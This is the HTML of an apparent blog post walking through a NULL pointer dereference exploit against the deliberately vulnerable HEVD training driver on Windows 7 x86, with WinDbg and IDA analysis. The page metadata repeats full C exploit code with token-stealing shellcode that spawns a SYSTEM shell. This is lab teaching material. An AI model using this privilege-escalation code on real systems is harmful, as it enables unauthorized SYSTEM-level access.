<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Windows Kernel Exploitation 0x04 | NULL Pointer Dereference [eng]</title>

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="assets/favicon.ico" rel="icon" type="image/x-icon" /> -->
  <link rel="shortcut icon" type="image/png" href="assets//favicon.png">
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Windows Kernel Exploitation 0x04 NULL Pointer Dereference [eng] | Windows Internals Blog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Windows Kernel Exploitation 0x04 NULL Pointer Dereference [eng]" />
<meta name="author" content="truebad0ur" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="this and this articles are combined Theory Somy theory information taken from the above articles At each bootup, the memory manager creates 2 memory pools (Paged Pool and NonPaged Pool) these are dynamically sized they are used for kernel-components to allocate system memory they start at a certain size (based on the physical memory in the system) the size of the pool can grow up to a maximum size (determined by the system at boot time) The paged pool can page out or can be lowered The paged pool consists of virtual memory that can be paged in and out of the system. The NonPaged Pool cannot be paged out (used by drivers so they can be accessed at any Interrupt Request Level) The nonpaged pool consists of virtual memory addresses that are guaranteed to reside in physical memory as long as the corresponding kernel objects are allocated. To improve performance, systems with a single processor have three “paged pools”, and multiprocessor systems have five paged pools. Same here, we’ll use Windows 7 x86. This can be exploited on Win 10 x32 as well, however starting with Win 8, Microsoft mitigated this vulnerability by making NULL page unavailable. NULL Pointer Dereference This time it’s NullPointerDereferenceIoctlHandler --&gt; TriggerNullPointerDereference function and it’s value 0x22202B Same here, let’s start writing sploit: Also got a good idea, which haven’t mentioned earlier: you can create shared folder between your hsot and virtual machine in Vbox and VMware (obviously) and avoid spending time of copy-pasting files when you compile it. You just need to open shared folder on vm. Preparation part is always the same: run windbg run virutal machine open shared folder on vm (Z:\kernel4\NullPoint\Release in my case) to copy compiled file to the desktop in windbg: ed nt!Kd_Default_Mask 8 .sympath+ C:\Users\truebad0ur\Documents\Kernel .reload /f lm m HEV* - check if out module is loaded bp HEVD!TriggerNullPointerDereference - break on out function We broke, all’s okay HEVD!TriggerNullPointerDereference: a7d4abe0 6a10 push 10h a7d4abe2 687882d4a7 push offset HEVD!__safe_se_handler_table+0x168 (a7d48278) No check the code out in IDA We see, that we call: push &#39;kcaH&#39; ; Tag push 8 ; NumberOfBytes push edi ; PoolType call ds:__imp__ExAllocatePoolWithTag@12 ; ExAllocatePoolWithTag(x,x,x) The tag of the allocated pool will be Hack NonPagedPool = 0 So it’s 8 bytes of non-paged pool memory with the tag kcaH We put a breakpoint on HEVD!TriggerNullPointerDereference+AE Because there we can see a7d4ac89 b8b0b0d0ba mov eax,0BAD0B0B0h a7d4ac8e 394508 cmp dword ptr [ebp+8],eax a7d4ac91 7527 jne HEVD!TriggerNullPointerDereference+0xda (a7d4acba) Looks like it waits for BAD0B0B0 as input from the user At the end of this function we have: xor esi, esi ... PAGE:00014CE9 push offset aTriggeringNull ; &quot;[+] Triggering Null Pointer Dereference&quot;... PAGE:00014CEE call _DbgPrint PAGE:00014CF3 pop ecx PAGE:00014CF4 call dword ptr [esi+4] We see that at the end [0+4] will be called –&gt; something at the zero page Put break on HEVD!TriggerNullPointerDereference+114 because a7d4acf4 ff5604 call dword ptr [esi+4] If we step in we can see the following: call dword ptr [esi+4] ds:0023:00000004=???????? a7d4acf4 ff5604 call dword ptr [esi+4] kd&gt; r esi esi=00000000 kd&gt; t [-] Exception Code: 0xC0000005 ****** HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE ****** We now need to allocate out shellcode there, so NtAllocateVirtualMemory will do it for us I use code by ThunderJie because he has very cool things which I should also use :) #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0) #define Null_Pointer_Dereference 0x22202b HANDLE hDevice = NULL; typedef NTSTATUS (WINAPI* My_NtAllocateVirtualMemory)( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PULONG RegionSize, IN ULONG AllocationType, IN ULONG Protect ); My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL; static VOID ShellCode() { _asm { //int 3 pop edi pop esi pop ebx pushad mov eax, fs: [124h] // Find the _KTHREAD structure for the current thread mov eax, [eax + 0x50] // Find the _EPROCESS structure mov ecx, eax mov edx, 4 // edx = system PID(4) // The loop is to get the _EPROCESS of the system find_sys_pid : mov eax, [eax + 0xb8] // Find the process activity list sub eax, 0xb8 // List traversal cmp[eax + 0xb4], edx // Determine whether it is SYSTEM based on PID jnz find_sys_pid // Replace the Token mov edx, [eax + 0xf8] mov[ecx + 0xf8], edx popad //int 3 ret } } BOOL init() { // Get HANDLE hDevice = CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); printf(&quot;[+]Start to get HANDLE...\n&quot;); if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) { return FALSE; } printf(&quot;[+]Success to get HANDLE!\n&quot;); return TRUE; } static VOID CreateCmd() { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW; WCHAR wzFilePath[MAX_PATH] = { L&quot;cmd.exe&quot; }; BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi); if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess); } VOID Trigger_shellcode() { DWORD bReturn = 0; char buf[4] = { 0 }; *(PDWORD32)(buf) = 0xAAAAAAAA; *(FARPROC*)&amp;NtAllocateVirtualMemory = GetProcAddress( GetModuleHandleW(L&quot;ntdll&quot;), &quot;NtAllocateVirtualMemory&quot;); if (NtAllocateVirtualMemory == NULL) { printf(&quot;[+]Failed to get function NtAllocateVirtualMemory!!!\n&quot;); system(&quot;pause&quot;); } PVOID Zero_addr = (PVOID)1; SIZE_T RegionSize = 0x1000; printf(&quot;[+]Started to alloc zero page...\n&quot;); if (!NT_SUCCESS(NtAllocateVirtualMemory( INVALID_HANDLE_VALUE, &amp;Zero_addr, 0, &amp;RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) || Zero_addr != NULL) { printf(&quot;[+]Failed to alloc zero page!\n&quot;); system(&quot;pause&quot;); } printf(&quot;[+]Success to alloc zero page...\n&quot;); *(DWORD*)(0x4) = (DWORD)&amp;ShellCode; DeviceIoControl(hDevice, Null_Pointer_Dereference, buf, 4, NULL, 0, &amp;bReturn, NULL); } int main() { if (init() == FALSE) { printf(&quot;[+]Failed to get HANDLE!!!\n&quot;); system(&quot;pause&quot;); return 0; } Trigger_shellcode(); //__debugbreak(); printf(&quot;[+]Start to Create cmd...\n&quot;); //CreateCmd(); system(&quot;cmd&quot;); return 0; } site site 2" />
<meta property="og:description" content="this and this articles are combined Theory Somy theory information taken from the above articles At each bootup, the memory manager creates 2 memory pools (Paged Pool and NonPaged Pool) these are dynamically sized they are used for kernel-components to allocate system memory they start at a certain size (based on the physical memory in the system) the size of the pool can grow up to a maximum size (determined by the system at boot time) The paged pool can page out or can be lowered The paged pool consists of virtual memory that can be paged in and out of the system. The NonPaged Pool cannot be paged out (used by drivers so they can be accessed at any Interrupt Request Level) The nonpaged pool consists of virtual memory addresses that are guaranteed to reside in physical memory as long as the corresponding kernel objects are allocated. To improve performance, systems with a single processor have three “paged pools”, and multiprocessor systems have five paged pools. Same here, we’ll use Windows 7 x86. This can be exploited on Win 10 x32 as well, however starting with Win 8, Microsoft mitigated this vulnerability by making NULL page unavailable. NULL Pointer Dereference This time it’s NullPointerDereferenceIoctlHandler --&gt; TriggerNullPointerDereference function and it’s value 0x22202B Same here, let’s start writing sploit: Also got a good idea, which haven’t mentioned earlier: you can create shared folder between your hsot and virtual machine in Vbox and VMware (obviously) and avoid spending time of copy-pasting files when you compile it. You just need to open shared folder on vm. Preparation part is always the same: run windbg run virutal machine open shared folder on vm (Z:\kernel4\NullPoint\Release in my case) to copy compiled file to the desktop in windbg: ed nt!Kd_Default_Mask 8 .sympath+ C:\Users\truebad0ur\Documents\Kernel .reload /f lm m HEV* - check if out module is loaded bp HEVD!TriggerNullPointerDereference - break on out function We broke, all’s okay HEVD!TriggerNullPointerDereference: a7d4abe0 6a10 push 10h a7d4abe2 687882d4a7 push offset HEVD!__safe_se_handler_table+0x168 (a7d48278) No check the code out in IDA We see, that we call: push &#39;kcaH&#39; ; Tag push 8 ; NumberOfBytes push edi ; PoolType call ds:__imp__ExAllocatePoolWithTag@12 ; ExAllocatePoolWithTag(x,x,x) The tag of the allocated pool will be Hack NonPagedPool = 0 So it’s 8 bytes of non-paged pool memory with the tag kcaH We put a breakpoint on HEVD!TriggerNullPointerDereference+AE Because there we can see a7d4ac89 b8b0b0d0ba mov eax,0BAD0B0B0h a7d4ac8e 394508 cmp dword ptr [ebp+8],eax a7d4ac91 7527 jne HEVD!TriggerNullPointerDereference+0xda (a7d4acba) Looks like it waits for BAD0B0B0 as input from the user At the end of this function we have: xor esi, esi ... PAGE:00014CE9 push offset aTriggeringNull ; &quot;[+] Triggering Null Pointer Dereference&quot;... PAGE:00014CEE call _DbgPrint PAGE:00014CF3 pop ecx PAGE:00014CF4 call dword ptr [esi+4] We see that at the end [0+4] will be called –&gt; something at the zero page Put break on HEVD!TriggerNullPointerDereference+114 because a7d4acf4 ff5604 call dword ptr [esi+4] If we step in we can see the following: call dword ptr [esi+4] ds:0023:00000004=???????? a7d4acf4 ff5604 call dword ptr [esi+4] kd&gt; r esi esi=00000000 kd&gt; t [-] Exception Code: 0xC0000005 ****** HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE ****** We now need to allocate out shellcode there, so NtAllocateVirtualMemory will do it for us I use code by ThunderJie because he has very cool things which I should also use :) #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0) #define Null_Pointer_Dereference 0x22202b HANDLE hDevice = NULL; typedef NTSTATUS (WINAPI* My_NtAllocateVirtualMemory)( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PULONG RegionSize, IN ULONG AllocationType, IN ULONG Protect ); My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL; static VOID ShellCode() { _asm { //int 3 pop edi pop esi pop ebx pushad mov eax, fs: [124h] // Find the _KTHREAD structure for the current thread mov eax, [eax + 0x50] // Find the _EPROCESS structure mov ecx, eax mov edx, 4 // edx = system PID(4) // The loop is to get the _EPROCESS of the system find_sys_pid : mov eax, [eax + 0xb8] // Find the process activity list sub eax, 0xb8 // List traversal cmp[eax + 0xb4], edx // Determine whether it is SYSTEM based on PID jnz find_sys_pid // Replace the Token mov edx, [eax + 0xf8] mov[ecx + 0xf8], edx popad //int 3 ret } } BOOL init() { // Get HANDLE hDevice = CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); printf(&quot;[+]Start to get HANDLE...\n&quot;); if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) { return FALSE; } printf(&quot;[+]Success to get HANDLE!\n&quot;); return TRUE; } static VOID CreateCmd() { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW; WCHAR wzFilePath[MAX_PATH] = { L&quot;cmd.exe&quot; }; BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi); if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess); } VOID Trigger_shellcode() { DWORD bReturn = 0; char buf[4] = { 0 }; *(PDWORD32)(buf) = 0xAAAAAAAA; *(FARPROC*)&amp;NtAllocateVirtualMemory = GetProcAddress( GetModuleHandleW(L&quot;ntdll&quot;), &quot;NtAllocateVirtualMemory&quot;); if (NtAllocateVirtualMemory == NULL) { printf(&quot;[+]Failed to get function NtAllocateVirtualMemory!!!\n&quot;); system(&quot;pause&quot;); } PVOID Zero_addr = (PVOID)1; SIZE_T RegionSize = 0x1000; printf(&quot;[+]Started to alloc zero page...\n&quot;); if (!NT_SUCCESS(NtAllocateVirtualMemory( INVALID_HANDLE_VALUE, &amp;Zero_addr, 0, &amp;RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) || Zero_addr != NULL) { printf(&quot;[+]Failed to alloc zero page!\n&quot;); system(&quot;pause&quot;); } printf(&quot;[+]Success to alloc zero page...\n&quot;); *(DWORD*)(0x4) = (DWORD)&amp;ShellCode; DeviceIoControl(hDevice, Null_Pointer_Dereference, buf, 4, NULL, 0, &amp;bReturn, NULL); } int main() { if (init() == FALSE) { printf(&quot;[+]Failed to get HANDLE!!!\n&quot;); system(&quot;pause&quot;); return 0; } Trigger_shellcode(); //__debugbreak(); printf(&quot;[+]Start to Create cmd...\n&quot;); //CreateCmd(); system(&quot;cmd&quot;); return 0; } site site 2" />
<meta property="og:site_name" content="Windows Internals Blog" />
<meta property="og:image" content="/assets/previews/14.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-10-23T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/previews/14.jpg" />
<meta property="twitter:title" content="Windows Kernel Exploitation 0x04 NULL Pointer Dereference [eng]" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"truebad0ur"},"dateModified":"2022-10-23T00:00:00+00:00","datePublished":"2022-10-23T00:00:00+00:00","description":"this and this articles are combined Theory Somy theory information taken from the above articles At each bootup, the memory manager creates 2 memory pools (Paged Pool and NonPaged Pool) these are dynamically sized they are used for kernel-components to allocate system memory they start at a certain size (based on the physical memory in the system) the size of the pool can grow up to a maximum size (determined by the system at boot time) The paged pool can page out or can be lowered The paged pool consists of virtual memory that can be paged in and out of the system. The NonPaged Pool cannot be paged out (used by drivers so they can be accessed at any Interrupt Request Level) The nonpaged pool consists of virtual memory addresses that are guaranteed to reside in physical memory as long as the corresponding kernel objects are allocated. To improve performance, systems with a single processor have three “paged pools”, and multiprocessor systems have five paged pools. Same here, we’ll use Windows 7 x86. This can be exploited on Win 10 x32 as well, however starting with Win 8, Microsoft mitigated this vulnerability by making NULL page unavailable. NULL Pointer Dereference This time it’s NullPointerDereferenceIoctlHandler --&gt; TriggerNullPointerDereference function and it’s value 0x22202B Same here, let’s start writing sploit: Also got a good idea, which haven’t mentioned earlier: you can create shared folder between your hsot and virtual machine in Vbox and VMware (obviously) and avoid spending time of copy-pasting files when you compile it. You just need to open shared folder on vm. Preparation part is always the same: run windbg run virutal machine open shared folder on vm (Z:\\kernel4\\NullPoint\\Release in my case) to copy compiled file to the desktop in windbg: ed nt!Kd_Default_Mask 8 .sympath+ C:\\Users\\truebad0ur\\Documents\\Kernel .reload /f lm m HEV* - check if out module is loaded bp HEVD!TriggerNullPointerDereference - break on out function We broke, all’s okay HEVD!TriggerNullPointerDereference: a7d4abe0 6a10 push 10h a7d4abe2 687882d4a7 push offset HEVD!__safe_se_handler_table+0x168 (a7d48278) No check the code out in IDA We see, that we call: push &#39;kcaH&#39; ; Tag push 8 ; NumberOfBytes push edi ; PoolType call ds:__imp__ExAllocatePoolWithTag@12 ; ExAllocatePoolWithTag(x,x,x) The tag of the allocated pool will be Hack NonPagedPool = 0 So it’s 8 bytes of non-paged pool memory with the tag kcaH We put a breakpoint on HEVD!TriggerNullPointerDereference+AE Because there we can see a7d4ac89 b8b0b0d0ba mov eax,0BAD0B0B0h a7d4ac8e 394508 cmp dword ptr [ebp+8],eax a7d4ac91 7527 jne HEVD!TriggerNullPointerDereference+0xda (a7d4acba) Looks like it waits for BAD0B0B0 as input from the user At the end of this function we have: xor esi, esi ... PAGE:00014CE9 push offset aTriggeringNull ; &quot;[+] Triggering Null Pointer Dereference&quot;... PAGE:00014CEE call _DbgPrint PAGE:00014CF3 pop ecx PAGE:00014CF4 call dword ptr [esi+4] We see that at the end [0+4] will be called –&gt; something at the zero page Put break on HEVD!TriggerNullPointerDereference+114 because a7d4acf4 ff5604 call dword ptr [esi+4] If we step in we can see the following: call dword ptr [esi+4] ds:0023:00000004=???????? a7d4acf4 ff5604 call dword ptr [esi+4] kd&gt; r esi esi=00000000 kd&gt; t [-] Exception Code: 0xC0000005 ****** HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE ****** We now need to allocate out shellcode there, so NtAllocateVirtualMemory will do it for us I use code by ThunderJie because he has very cool things which I should also use :) #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0) #define Null_Pointer_Dereference 0x22202b HANDLE hDevice = NULL; typedef NTSTATUS (WINAPI* My_NtAllocateVirtualMemory)( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PULONG RegionSize, IN ULONG AllocationType, IN ULONG Protect ); My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL; static VOID ShellCode() { _asm { //int 3 pop edi pop esi pop ebx pushad mov eax, fs: [124h] // Find the _KTHREAD structure for the current thread mov eax, [eax + 0x50] // Find the _EPROCESS structure mov ecx, eax mov edx, 4 // edx = system PID(4) // The loop is to get the _EPROCESS of the system find_sys_pid : mov eax, [eax + 0xb8] // Find the process activity list sub eax, 0xb8 // List traversal cmp[eax + 0xb4], edx // Determine whether it is SYSTEM based on PID jnz find_sys_pid // Replace the Token mov edx, [eax + 0xf8] mov[ecx + 0xf8], edx popad //int 3 ret } } BOOL init() { // Get HANDLE hDevice = CreateFileA(&quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); printf(&quot;[+]Start to get HANDLE...\\n&quot;); if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) { return FALSE; } printf(&quot;[+]Success to get HANDLE!\\n&quot;); return TRUE; } static VOID CreateCmd() { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW; WCHAR wzFilePath[MAX_PATH] = { L&quot;cmd.exe&quot; }; BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi); if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess); } VOID Trigger_shellcode() { DWORD bReturn = 0; char buf[4] = { 0 }; *(PDWORD32)(buf) = 0xAAAAAAAA; *(FARPROC*)&amp;NtAllocateVirtualMemory = GetProcAddress( GetModuleHandleW(L&quot;ntdll&quot;), &quot;NtAllocateVirtualMemory&quot;); if (NtAllocateVirtualMemory == NULL) { printf(&quot;[+]Failed to get function NtAllocateVirtualMemory!!!\\n&quot;); system(&quot;pause&quot;); } PVOID Zero_addr = (PVOID)1; SIZE_T RegionSize = 0x1000; printf(&quot;[+]Started to alloc zero page...\\n&quot;); if (!NT_SUCCESS(NtAllocateVirtualMemory( INVALID_HANDLE_VALUE, &amp;Zero_addr, 0, &amp;RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) || Zero_addr != NULL) { printf(&quot;[+]Failed to alloc zero page!\\n&quot;); system(&quot;pause&quot;); } printf(&quot;[+]Success to alloc zero page...\\n&quot;); *(DWORD*)(0x4) = (DWORD)&amp;ShellCode; DeviceIoControl(hDevice, Null_Pointer_Dereference, buf, 4, NULL, 0, &amp;bReturn, NULL); } int main() { if (init() == FALSE) { printf(&quot;[+]Failed to get HANDLE!!!\\n&quot;); system(&quot;pause&quot;); return 0; } Trigger_shellcode(); //__debugbreak(); printf(&quot;[+]Start to Create cmd...\\n&quot;); //CreateCmd(); system(&quot;cmd&quot;); return 0; } site site 2","headline":"Windows Kernel Exploitation 0x04 NULL Pointer Dereference [eng]","image":"/assets/previews/14.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"/2022/10/23/Windows-Kernel-Exploitation-0x04.html"},"url":"/2022/10/23/Windows-Kernel-Exploitation-0x04.html"}</script>
<!-- End Jekyll SEO tag -->

</head>

<link href="assets/favicon.ico" rel="icon" type="image/x-icon" />

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    <link rel="shortcut icon" href="/assets/favicon.ico">
    
    <h1>truebad0ur@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive.html"><h2 class="header-link">Archive</h2></a>
<a href="/about.html"><h2 class="header-link">About</h2></a>
<a href="/ToDo.html"><h2 class="header-link">ToDo</h2></a>
<a href="/Certificates.html"><h2 class="header-link">Certificates</h2></a>
<!--<a href="https://t.me/reverse_dungeon"><h2 class="header-link">Telegram</h2></a>-->

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <p><a href="https://rootkits.xyz/blog/2018/01/kernel-null-pointer-dereference/">this</a> and <a href="https://h0mbre.github.io/HEVD_NULLPointerDereference_32bit/#">this</a> articles are combined</p>

<h2 id="theory"><a href="#header-2"></a>Theory</h2>

<p>Somy theory information taken from the above articles</p>

<p>At each bootup, the memory manager creates 2 memory pools (Paged Pool and NonPaged Pool)</p>

<ul>
  <li>these are dynamically sized</li>
  <li>they are used for kernel-components to allocate system memory</li>
  <li>they start at a certain size (based on the physical memory in the system)</li>
  <li>the size of the pool can grow up to a maximum size (determined by the system at boot time)</li>
  <li>The paged pool can page out or can be lowered</li>
  <li>The paged pool consists of virtual memory that can be paged in and out of the system.</li>
  <li>
    <p>The NonPaged Pool cannot be paged out (used by drivers so they can be accessed at any Interrupt Request Level)</p>
  </li>
  <li>The nonpaged pool consists of virtual memory addresses that are guaranteed to reside in physical memory as long as the corresponding kernel objects are allocated.</li>
  <li>To improve performance, systems with a single processor have three “paged pools”, and multiprocessor systems have five paged pools.</li>
</ul>

<p>Same here, we’ll use Windows 7 x86. This can be exploited on Win 10 x32 as well, however starting with Win 8, Microsoft mitigated this vulnerability by making NULL page unavailable.</p>

<h2 id="null-pointer-dereference"><a href="#header-2"></a>NULL Pointer Dereference</h2>

<p>This time it’s <code class="language-plaintext highlighter-rouge">NullPointerDereferenceIoctlHandler --&gt; TriggerNullPointerDereference</code> function and it’s value 0x22202B</p>

<p>Same here, let’s start writing sploit:</p>

<p>Also got a good idea, which haven’t mentioned earlier: you can create shared folder between your hsot and virtual machine in Vbox and VMware (obviously) and avoid spending time of copy-pasting files when you compile it. You just need to open shared folder on vm.</p>

<p>Preparation part is always the same:</p>

<ul>
  <li>run windbg</li>
  <li>run virutal machine</li>
  <li>open shared folder on vm (<code class="language-plaintext highlighter-rouge">Z:\kernel4\NullPoint\Release</code> in my case) to copy compiled file to the desktop</li>
  <li>in windbg:</li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">ed nt!Kd_Default_Mask 8</code></li>
    </ul>
  </li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">.sympath+ C:\Users\truebad0ur\Documents\Kernel</code></li>
    </ul>
  </li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">.reload /f</code></li>
    </ul>
  </li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">lm m HEV*</code> - check if out module is loaded</li>
    </ul>
  </li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">bp HEVD!TriggerNullPointerDereference</code> - break on out function</li>
    </ul>
  </li>
</ul>

<p>We broke, all’s okay</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerNullPointerDereference</span><span class="p">:</span>
<span class="nx">a7d4abe0</span> <span class="mi">6</span><span class="nx">a10</span>            <span class="nx">push</span>    <span class="mi">10</span><span class="nx">h</span>
<span class="nx">a7d4abe2</span> <span class="mi">687882</span><span class="nx">d4a7</span>      <span class="nx">push</span>    <span class="nx">offset</span> <span class="nx">HEVD</span><span class="o">!</span><span class="nx">__safe_se_handler_table</span><span class="o">+</span><span class="mh">0x168</span> <span class="p">(</span><span class="nx">a7d48278</span><span class="p">)</span>
</code></pre></div></div>

<p>No check the code out in IDA</p>

<p>We see, that we call:</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">push</span>    <span class="err">'</span><span class="n">kcaH</span><span class="err">'</span>          <span class="p">;</span> <span class="n">Tag</span>
<span class="n">push</span>    <span class="mi">8</span>               <span class="p">;</span> <span class="n">NumberOfBytes</span>
<span class="n">push</span>    <span class="n">edi</span>             <span class="p">;</span> <span class="n">PoolType</span>
<span class="n">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">__imp__ExAllocatePoolWithTag</span><span class="err">@</span><span class="mi">12</span> <span class="p">;</span> <span class="n">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
</code></pre></div></div>

<p>The tag of the allocated pool will be Hack</p>

<p>NonPagedPool = 0</p>

<p>So it’s 8 bytes of non-paged pool memory with the tag kcaH</p>

<p>We put a breakpoint on <code class="language-plaintext highlighter-rouge">HEVD!TriggerNullPointerDereference+AE</code></p>

<p>Because there we can see</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">a7d4ac89</span> <span class="nx">b8b0b0d0ba</span>      <span class="nx">mov</span>     <span class="nx">eax</span><span class="p">,</span><span class="mi">0</span><span class="nx">BAD0B0B0h</span>
<span class="nx">a7d4ac8e</span> <span class="mi">394508</span>          <span class="nx">cmp</span>     <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ebp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span><span class="nx">eax</span>
<span class="nx">a7d4ac91</span> <span class="mi">7527</span>            <span class="nx">jne</span>     <span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerNullPointerDereference</span><span class="o">+</span><span class="mh">0xda</span> <span class="p">(</span><span class="nx">a7d4acba</span><span class="p">)</span>
</code></pre></div></div>

<p>Looks like it waits for BAD0B0B0 as input from the user</p>

<p>At the end of this function we have:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">xor</span>     <span class="nx">esi</span><span class="p">,</span> <span class="nx">esi</span>
<span class="p">...</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">CE9</span>                 <span class="nx">push</span>    <span class="nx">offset</span> <span class="nx">aTriggeringNull</span> <span class="p">;</span> <span class="dl">"</span><span class="s2">[+] Triggering Null Pointer Dereference</span><span class="dl">"</span><span class="p">...</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">CEE</span>                 <span class="nx">call</span>    <span class="nx">_DbgPrint</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">CF3</span>                 <span class="nx">pop</span>     <span class="nx">ecx</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">CF4</span>                 <span class="nx">call</span>    <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</code></pre></div></div>

<p><img src="/assets/post_images/11.png" alt="Deref" /></p>

<p>We see that at the end [0+4] will be called –&gt; something at the zero page</p>

<p>Put break on <code class="language-plaintext highlighter-rouge">HEVD!TriggerNullPointerDereference+114</code> because <code class="language-plaintext highlighter-rouge">a7d4acf4 ff5604          call    dword ptr [esi+4]</code></p>

<p>If we step in we can see the following:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">call</span>    <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>    <span class="nx">ds</span><span class="p">:</span><span class="mi">0023</span><span class="p">:</span><span class="mi">00000004</span><span class="o">=????????</span>


<span class="nx">a7d4acf4</span> <span class="nx">ff5604</span>          <span class="nx">call</span>    <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">r</span> <span class="nx">esi</span>
<span class="nx">esi</span><span class="o">=</span><span class="mi">00000000</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">t</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">Exception</span> <span class="nx">Code</span><span class="p">:</span> <span class="mh">0xC0000005</span>
<span class="o">******</span> <span class="nx">HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE</span> <span class="o">******</span>
</code></pre></div></div>

<p>We now need to allocate out shellcode there, so NtAllocateVirtualMemory will do it for us</p>

<p>I use code by <a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/Null-Pointer-Dereference/Null-Pointer-Dereference/Null-Pointer-Dereference.c">ThunderJie</a> because he has very cool things which I should also use :)</p>

